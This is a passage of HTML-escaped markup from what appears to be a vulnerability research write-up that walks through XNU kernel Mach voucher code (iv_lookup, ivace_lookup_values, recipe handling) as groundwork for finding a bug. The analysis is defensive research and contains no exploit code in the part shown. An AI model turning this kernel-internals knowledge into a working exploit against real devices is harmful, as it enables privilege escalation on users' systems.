class="BGLtzooHlW-c2"&gt;(&lt;/span&gt;&lt;span class="BGLtzooHlW-c4"&gt;IVAM_NULL &lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;==&lt;/span&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp;ivam&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;)&lt;/span&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;{&lt;/span&gt;&lt;/p&gt; &lt;p class="BGLtzooHlW-c0"&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class="BGLtzooHlW-c6"&gt;return&lt;/span&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp;KERN_INVALID_ARGUMENT&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;;&lt;/span&gt;&lt;/p&gt; &lt;p class="BGLtzooHlW-c0"&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;}&lt;/span&gt;&lt;/p&gt; &lt;p class="BGLtzooHlW-c0"&gt;&lt;span class="BGLtzooHlW-c2"&gt;..&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt; &lt;p class="BGLtzooHlW-c0 BGLtzooHlW-c5 BGLtzooHlW-c8"&gt;&lt;span class="BGLtzooHlW-c10"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="BGLtzooHlW-c0 BGLtzooHlW-c5"&gt;&lt;span class="BGLtzooHlW-c11"&gt;iv_key_to_index&lt;/span&gt;&lt;span&gt;&amp;nbsp;just subtracts 1 from key (assuming it&amp;#39;s valid and not &lt;/span&gt;&lt;span class="BGLtzooHlW-c11"&gt;MACH_VOUCHER_ATRR_KEY_ALL&lt;/span&gt;&lt;span class="BGLtzooHlW-c10"&gt;):&lt;/span&gt;&lt;/p&gt; &lt;p class="BGLtzooHlW-c0 BGLtzooHlW-c5 BGLtzooHlW-c8"&gt;&lt;span class="BGLtzooHlW-c10"&gt;&lt;/span&gt;&lt;/p&gt;&lt;a id="t.bb233177f78d9071ef9e7fd9994b192f8d1f87d3"&gt;&lt;/a&gt;&lt;a id="t.18"&gt;&lt;/a&gt;&lt;table class="BGLtzooHlW-c12"&gt;&lt;tbody&gt;&lt;tr class="BGLtzooHlW-c1"&gt;&lt;td class="BGLtzooHlW-c13" colspan="1" rowspan="1"&gt; &lt;p class="BGLtzooHlW-c0"&gt;&lt;span class="BGLtzooHlW-c6"&gt;static&lt;/span&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="BGLtzooHlW-c6"&gt;inline&lt;/span&gt;&lt;span class="BGLtzooHlW-c3"&gt;&amp;nbsp;iv_index_t&lt;/span&gt;&lt;/p&gt; &lt;p class="BGLtzooHlW-c0"&gt;&lt;span class="BGLtzooHlW-c4"&gt;iv_key_to_index&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;(&lt;/span&gt;&lt;span class="BGLtzooHlW-c4"&gt;mach_voucher_attr_key_t key&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;)&lt;/span&gt;&lt;/p&gt; &lt;p class="BGLtzooHlW-c0"&gt;&lt;span class="BGLtzooHlW-c2"&gt;{&lt;/span&gt;&lt;/p&gt; &lt;p class="BGLtzooHlW-c0"&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class="BGLtzooHlW-c6"&gt;if&lt;/span&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;(&lt;/span&gt;&lt;span class="BGLtzooHlW-c4"&gt;MACH_VOUCHER_ATTR_KEY_ALL &lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;==&lt;/span&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp;key &lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;||&lt;/span&gt;&lt;/p&gt; &lt;p class="BGLtzooHlW-c0"&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; MACH_VOUCHER_ATTR_KEY_NUM_WELL_KNOWN &lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;&amp;lt;&lt;/span&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp;key&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;)&lt;/span&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;{&lt;/span&gt;&lt;/p&gt; &lt;p class="BGLtzooHlW-c0"&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class="BGLtzooHlW-c6"&gt;return&lt;/span&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp;IV_UNUSED_KEYINDEX&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;;&lt;/span&gt;&lt;/p&gt; &lt;p class="BGLtzooHlW-c0"&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;}&lt;/span&gt;&lt;/p&gt; &lt;p class="BGLtzooHlW-c0"&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class="BGLtzooHlW-c6"&gt;return&lt;/span&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;(&lt;/span&gt;&lt;span class="BGLtzooHlW-c4"&gt;iv_index_t&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;)&lt;/span&gt;&lt;span class="BGLtzooHlW-c4"&gt;key &lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;-&lt;/span&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="BGLtzooHlW-c15"&gt;1&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;;&lt;/span&gt;&lt;/p&gt; &lt;p class="BGLtzooHlW-c0"&gt;&lt;span class="BGLtzooHlW-c2"&gt;}&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt; &lt;p class="BGLtzooHlW-c0 BGLtzooHlW-c5 BGLtzooHlW-c8"&gt;&lt;span class="BGLtzooHlW-c10"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="BGLtzooHlW-c0 BGLtzooHlW-c5"&gt;&lt;span class="BGLtzooHlW-c11"&gt;ivgt_lookup&lt;/span&gt;&lt;span class="BGLtzooHlW-c10"&gt;&amp;nbsp;then gets a reference on that key&amp;#39;s attr manager and attr controller. The manager is really just a bunch of function pointers which define the semantics of what different &amp;quot;key types&amp;quot; actually mean; and the controller stores (and caches) values for those keys.&lt;/span&gt;&lt;/p&gt; &lt;p class="BGLtzooHlW-c0 BGLtzooHlW-c5 BGLtzooHlW-c8"&gt;&lt;span class="BGLtzooHlW-c10"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="BGLtzooHlW-c0 BGLtzooHlW-c5"&gt;&lt;span&gt;Let&amp;#39;s keep reading &lt;/span&gt;&lt;span class="BGLtzooHlW-c11"&gt;ipc_replace_voucher_value&lt;/span&gt;&lt;span class="BGLtzooHlW-c10"&gt;. Here&amp;#39;s the next statement:&lt;/span&gt;&lt;/p&gt; &lt;p class="BGLtzooHlW-c0 BGLtzooHlW-c5 BGLtzooHlW-c8"&gt;&lt;span class="BGLtzooHlW-c10"&gt;&lt;/span&gt;&lt;/p&gt;&lt;a id="t.ab9235fa2555d8200bd62bdf3838f3a821ead649"&gt;&lt;/a&gt;&lt;a id="t.19"&gt;&lt;/a&gt;&lt;table class="BGLtzooHlW-c12"&gt;&lt;tbody&gt;&lt;tr class="BGLtzooHlW-c1"&gt;&lt;td class="BGLtzooHlW-c13" colspan="1" rowspan="1"&gt; &lt;p class="BGLtzooHlW-c0"&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class="BGLtzooHlW-c7"&gt;/* save the current value stored in the forming voucher */&lt;/span&gt;&lt;/p&gt; &lt;p class="BGLtzooHlW-c0"&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; save_val_index &lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;=&lt;/span&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp;iv_lookup&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;(&lt;/span&gt;&lt;span class="BGLtzooHlW-c4"&gt;voucher&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;,&lt;/span&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp;key_index&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;);&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt; &lt;p class="BGLtzooHlW-c0 BGLtzooHlW-c5 BGLtzooHlW-c8"&gt;&lt;span class="BGLtzooHlW-c10"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="BGLtzooHlW-c0 BGLtzooHlW-c5"&gt;&lt;span&gt;This point is important for getting a good feeling for how the voucher code is supposed to work; recipes can refer not only to other vouchers (via the &lt;/span&gt;&lt;span class="BGLtzooHlW-c11"&gt;previous_voucher&lt;/span&gt;&lt;span&gt;&amp;nbsp;port) but they can also refer to &lt;/span&gt;&lt;span class="BGLtzooHlW-c17"&gt;themselves&lt;/span&gt;&lt;span&gt;&amp;nbsp;during creation.&lt;/span&gt;&lt;span&gt;&amp;nbsp;You don&amp;#39;t have to have just one sub-recipe per attr type for which you wish to have a value in your voucher; you can specify multiple sub-recipes for that type. &lt;/span&gt;&lt;span&gt;Does it actually make any sense to do that? Well, luckily for the security researcher we don&amp;#39;t have to worry about whether functionality actually makes any sense; it&amp;#39;s all just a weird machine to us!&lt;/span&gt;&lt;span class="BGLtzooHlW-c10"&gt;&amp;nbsp;(There&amp;#39;s allusions in the code to future functionality where attribute values can be &amp;quot;layered&amp;quot; or &amp;quot;linked&amp;quot; but for now such functionality doesn&amp;#39;t exist.)&lt;/span&gt;&lt;/p&gt; &lt;p class="BGLtzooHlW-c0 BGLtzooHlW-c5 BGLtzooHlW-c8"&gt;&lt;span class="BGLtzooHlW-c10"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="BGLtzooHlW-c0 BGLtzooHlW-c5"&gt;&lt;span class="BGLtzooHlW-c11"&gt;iv_lookup&lt;/span&gt;&lt;span&gt;&amp;nbsp;returns the &amp;quot;value index&amp;quot; for the given key in the particular voucher. That means it just returns the &lt;/span&gt;&lt;span class="BGLtzooHlW-c11"&gt;iv_index_t&lt;/span&gt;&lt;span&gt;&amp;nbsp;in the &lt;/span&gt;&lt;span class="BGLtzooHlW-c11"&gt;iv_table&lt;/span&gt;&lt;span class="BGLtzooHlW-c10"&gt;&amp;nbsp;of the given voucher:&lt;/span&gt;&lt;/p&gt; &lt;p class="BGLtzooHlW-c0 BGLtzooHlW-c5 BGLtzooHlW-c8"&gt;&lt;span class="BGLtzooHlW-c10"&gt;&lt;/span&gt;&lt;/p&gt;&lt;a id="t.18a23982f89054f9b506caa6cac52aa2dd16172b"&gt;&lt;/a&gt;&lt;a id="t.20"&gt;&lt;/a&gt;&lt;table class="BGLtzooHlW-c12"&gt;&lt;tbody&gt;&lt;tr class="BGLtzooHlW-c1"&gt;&lt;td class="BGLtzooHlW-c13" colspan="1" rowspan="1"&gt; &lt;p class="BGLtzooHlW-c0"&gt;&lt;span class="BGLtzooHlW-c6"&gt;static&lt;/span&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="BGLtzooHlW-c6"&gt;inline&lt;/span&gt;&lt;span class="BGLtzooHlW-c3"&gt;&amp;nbsp;iv_index_t&lt;/span&gt;&lt;/p&gt; &lt;p class="BGLtzooHlW-c0"&gt;&lt;span class="BGLtzooHlW-c4"&gt;iv_lookup&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;(&lt;/span&gt;&lt;span class="BGLtzooHlW-c4"&gt;ipc_voucher_t iv&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;,&lt;/span&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp;iv_index_t key_index&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;)&lt;/span&gt;&lt;/p&gt; &lt;p class="BGLtzooHlW-c0"&gt;&lt;span class="BGLtzooHlW-c2"&gt;{&lt;/span&gt;&lt;/p&gt; &lt;p class="BGLtzooHlW-c0"&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class="BGLtzooHlW-c6"&gt;if&lt;/span&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;(&lt;/span&gt;&lt;span class="BGLtzooHlW-c4"&gt;key_index &lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;&amp;lt;&lt;/span&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp;iv&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;-&amp;gt;&lt;/span&gt;&lt;span class="BGLtzooHlW-c4"&gt;iv_table_size&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;)&lt;/span&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;{&lt;/span&gt;&lt;/p&gt; &lt;p class="BGLtzooHlW-c0"&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class="BGLtzooHlW-c6"&gt;return&lt;/span&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp;iv&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;-&amp;gt;&lt;/span&gt;&lt;span class="BGLtzooHlW-c4"&gt;iv_table&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;[&lt;/span&gt;&lt;span class="BGLtzooHlW-c4"&gt;key_index&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;];&lt;/span&gt;&lt;/p&gt; &lt;p class="BGLtzooHlW-c0"&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;}&lt;/span&gt;&lt;/p&gt; &lt;p class="BGLtzooHlW-c0"&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class="BGLtzooHlW-c6"&gt;return&lt;/span&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp;IV_UNUSED_VALINDEX&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;;&lt;/span&gt;&lt;/p&gt; &lt;p class="BGLtzooHlW-c0"&gt;&lt;span class="BGLtzooHlW-c2"&gt;}&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt; &lt;p class="BGLtzooHlW-c0 BGLtzooHlW-c5 BGLtzooHlW-c8"&gt;&lt;span class="BGLtzooHlW-c10"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="BGLtzooHlW-c0 BGLtzooHlW-c5"&gt;&lt;span&gt;This value index uniquely identifies an existing attribute value, but you need to ask the attribute&amp;#39;s controller for the actual value. Before getting that previous value &lt;/span&gt;&lt;span&gt;though, the&lt;/span&gt;&lt;span&gt;&amp;nbsp;code first determines whether this sub-recipe might be trying to refer to the value currently stored by this voucher or has explicitly passed in a &lt;/span&gt;&lt;span class="BGLtzooHlW-c11"&gt;previous_voucher&lt;/span&gt;&lt;span class="BGLtzooHlW-c10"&gt;. The value in the previous voucher takes precedence over whatever is already in the under-construction voucher.&lt;/span&gt;&lt;/p&gt; &lt;p class="BGLtzooHlW-c0 BGLtzooHlW-c5 BGLtzooHlW-c8"&gt;&lt;span class="BGLtzooHlW-c10"&gt;&lt;/span&gt;&lt;/p&gt;&lt;a id="t.f5a4045ea337ae1a6d9765b8d290b9e3f343559c"&gt;&lt;/a&gt;&lt;a id="t.21"&gt;&lt;/a&gt;&lt;table class="BGLtzooHlW-c12"&gt;&lt;tbody&gt;&lt;tr class="BGLtzooHlW-c1"&gt;&lt;td class="BGLtzooHlW-c13" colspan="1" rowspan="1"&gt; &lt;p class="BGLtzooHlW-c0"&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; prev_val_index &lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;=&lt;/span&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;(&lt;/span&gt;&lt;span class="BGLtzooHlW-c4"&gt;IV_NULL &lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;!=&lt;/span&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp;prev_voucher&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;)&lt;/span&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;?&lt;/span&gt;&lt;/p&gt; &lt;p class="BGLtzooHlW-c0"&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; iv_lookup&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;(&lt;/span&gt;&lt;span class="BGLtzooHlW-c4"&gt;prev_voucher&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;,&lt;/span&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp;key_index&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;)&lt;/span&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;:&lt;/span&gt;&lt;/p&gt; &lt;p class="BGLtzooHlW-c0"&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; save_val_index&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;;&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt; &lt;p class="BGLtzooHlW-c0 BGLtzooHlW-c5 BGLtzooHlW-c8"&gt;&lt;span class="BGLtzooHlW-c10"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="BGLtzooHlW-c0 BGLtzooHlW-c5"&gt;&lt;span class="BGLtzooHlW-c10"&gt;Then the code looks up the actual previous value to operate on:&lt;/span&gt;&lt;/p&gt; &lt;p class="BGLtzooHlW-c0 BGLtzooHlW-c5 BGLtzooHlW-c8"&gt;&lt;span class="BGLtzooHlW-c19 BGLtzooHlW-c11"&gt;&lt;/span&gt;&lt;/p&gt;&lt;a id="t.3d5b30b0ca79263b24534436b9c17b9f568c14c6"&gt;&lt;/a&gt;&lt;a id="t.22"&gt;&lt;/a&gt;&lt;table class="BGLtzooHlW-c12"&gt;&lt;tbody&gt;&lt;tr class="BGLtzooHlW-c1"&gt;&lt;td class="BGLtzooHlW-c13" colspan="1" rowspan="1"&gt; &lt;p class="BGLtzooHlW-c0"&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; ivace_lookup_values&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;(&lt;/span&gt;&lt;span class="BGLtzooHlW-c4"&gt;key_index&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;,&lt;/span&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp;prev_val_index&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;,&lt;/span&gt;&lt;/p&gt; &lt;p class="BGLtzooHlW-c0"&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; previous_vals&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;,&lt;/span&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;&amp;amp;&lt;/span&gt;&lt;span class="BGLtzooHlW-c4"&gt;previous_vals_count&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;);&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt; &lt;p class="BGLtzooHlW-c0 BGLtzooHlW-c5 BGLtzooHlW-c8"&gt;&lt;span class="BGLtzooHlW-c10"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="BGLtzooHlW-c0 BGLtzooHlW-c5"&gt;&lt;span class="BGLtzooHlW-c11"&gt;key_index&lt;/span&gt;&lt;span&gt;&amp;nbsp;is the key we&amp;#39;re operating on, &lt;/span&gt;&lt;span class="BGLtzooHlW-c11"&gt;MACH_VOUCHER_ATTR_KEY_USER_DATA&lt;/span&gt;&lt;span&gt;&amp;nbsp;in this example. This function is called &lt;/span&gt;&lt;span class="BGLtzooHlW-c11"&gt;ivace_lookup_values&lt;/span&gt;&lt;span&gt;&amp;nbsp;(note the plural). There are some comments in the voucher code indicating that maybe in the future values could themselves be put into a linked-list such that you could have larger values (or layered/chained values.) But this functionality isn&amp;#39;t implemented; &lt;/span&gt;&lt;span class="BGLtzooHlW-c11"&gt;ivace_lookup_values&lt;/span&gt;&lt;span class="BGLtzooHlW-c10"&gt;&amp;nbsp;will only ever return 1 value.&lt;/span&gt;&lt;/p&gt; &lt;p class="BGLtzooHlW-c0 BGLtzooHlW-c5 BGLtzooHlW-c8"&gt;&lt;span class="BGLtzooHlW-c10"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="BGLtzooHlW-c0 BGLtzooHlW-c5"&gt;&lt;span&gt;Here&amp;#39;s &lt;/span&gt;&lt;span class="BGLtzooHlW-c11"&gt;ivace_lookup_values&lt;/span&gt;&lt;span class="BGLtzooHlW-c10"&gt;:&lt;/span&gt;&lt;/p&gt; &lt;p class="BGLtzooHlW-c0 BGLtzooHlW-c5 BGLtzooHlW-c8"&gt;&lt;span class="BGLtzooHlW-c10"&gt;&lt;/span&gt;&lt;/p&gt;&lt;a id="t.8394840551adb03f1e3384056efc45160047f0ab"&gt;&lt;/a&gt;&lt;a id="t.23"&gt;&lt;/a&gt;&lt;table class="BGLtzooHlW-c12"&gt;&lt;tbody&gt;&lt;tr class="BGLtzooHlW-c1"&gt;&lt;td class="BGLtzooHlW-c13" colspan="1" rowspan="1"&gt; &lt;p class="BGLtzooHlW-c0"&gt;&lt;span class="BGLtzooHlW-c6"&gt;static&lt;/span&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="BGLtzooHlW-c6"&gt;void&lt;/span&gt;&lt;/p&gt; &lt;p class="BGLtzooHlW-c0"&gt;&lt;span class="BGLtzooHlW-c4"&gt;ivace_lookup_values&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;(&lt;/span&gt;&lt;/p&gt; &lt;p class="BGLtzooHlW-c0"&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; iv_index_t &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;key_index&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;,&lt;/span&gt;&lt;/p&gt; &lt;p class="BGLtzooHlW-c0"&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; iv_index_t &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;value_index&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;,&lt;/span&gt;&lt;/p&gt; &lt;p class="BGLtzooHlW-c0"&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; mach_voucher_attr_value_handle_array_t &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;values&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;,&lt;/span&gt;&lt;/p&gt; &lt;p class="BGLtzooHlW-c0"&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; mach_voucher_attr_value_handle_array_size_t &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;*&lt;/span&gt;&lt;span class="BGLtzooHlW-c4"&gt;count&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;)&lt;/span&gt;&lt;/p&gt; &lt;p class="BGLtzooHlW-c0"&gt;&lt;span class="BGLtzooHlW-c2"&gt;{&lt;/span&gt;&lt;/p&gt; &lt;p class="BGLtzooHlW-c0"&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; ipc_voucher_attr_control_t ivac&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;;&lt;/span&gt;&lt;/p&gt; &lt;p class="BGLtzooHlW-c0"&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; ivac_entry_t ivace&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;;&lt;/span&gt;&lt;/p&gt; &lt;p class="BGLtzooHlW-c0 BGLtzooHlW-c8"&gt;&lt;span class="BGLtzooHlW-c3"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="BGLtzooHlW-c0"&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class="BGLtzooHlW-c6"&gt;if&lt;/span&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;(&lt;/span&gt;&lt;span class="BGLtzooHlW-c4"&gt;IV_UNUSED_VALINDEX &lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;==&lt;/span&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp;value_index &lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;||&lt;/span&gt;&lt;/p&gt; &lt;p class="BGLtzooHlW-c0"&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; MACH_VOUCHER_ATTR_KEY_NUM_WELL_KNOWN &lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;&amp;lt;=&lt;/span&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp;key_index&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;)&lt;/span&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;{&lt;/span&gt;&lt;/p&gt; &lt;p class="BGLtzooHlW-c0"&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;*&lt;/span&gt;&lt;span class="BGLtzooHlW-c4"&gt;count &lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;=&lt;/span&gt;&lt;span 